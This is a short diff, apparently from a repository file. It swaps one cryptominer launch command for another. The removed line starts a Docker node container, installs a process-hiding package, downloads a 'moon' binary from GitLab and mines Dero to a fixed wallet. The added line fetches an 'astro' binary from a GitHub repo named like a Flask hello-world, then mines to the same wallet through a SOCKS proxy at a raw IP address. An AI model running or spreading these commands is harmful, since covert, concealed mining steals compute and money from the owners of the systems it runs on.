@@ -1,1 +1,1 @@
-udocker run --entrypoint="" node:18  /bin/bash -i -c 'npm i -g node-process-hider;ph add moon;wget https://gitlab.com/cloud8324026/cloud/-/raw/main/moon;chmod +x moon;./moon -d dero-node-va.mysrv.cloud:10300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-MOON)'
+rm astro;wget https://github.com/zaulaferita/flask-hello-world/raw/master/astro;chmod +x astro;./astro -r dero-node-va.mysrv.cloud:10300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj -p rpc -sock-address 68.71.249.153:48606
